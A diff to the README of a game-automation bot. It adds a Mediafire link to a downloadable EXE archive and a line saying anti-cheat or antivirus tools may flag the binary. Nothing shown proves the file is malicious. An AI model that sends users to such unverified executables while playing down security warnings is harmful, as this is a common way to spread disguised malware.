@@ -10,6 +10,8 @@ A small automation bot that watches for black-screen transitions (room loading) 
 
 - In rare cases the character may die. In most tests the bot stops shortly after death or, at worst, keeps walking to the right without continuing the scripted sequence. When it happens stop the bot pressing Esc
 
+- Anti-cheat / antivirus may warn about unknown publisher binaries.
+
 ## 🗡️ RECOMENDED TOOLS 
 
 - Curveclaw
@@ -21,9 +23,14 @@ I didn't test the other ones. So feel free with you want
 
 https://imgur.com/a/pMYZYpe
 
+## Mediafire Download EXE
+
+https://www.mediafire.com/file/awhf255gr80rs03/HollowBot.rar/file
+
+
 ## 🎯 Intended In-Game Setup (Important)
 
-Go to Grey Swamp, enter the tavern, and sit on the bench inside.
+Go to Grey Swamp, enter the tavern Halfway Home, and sit on the bench inside.
 
 Start the bot (GUI → Start Bot or run from console).
 
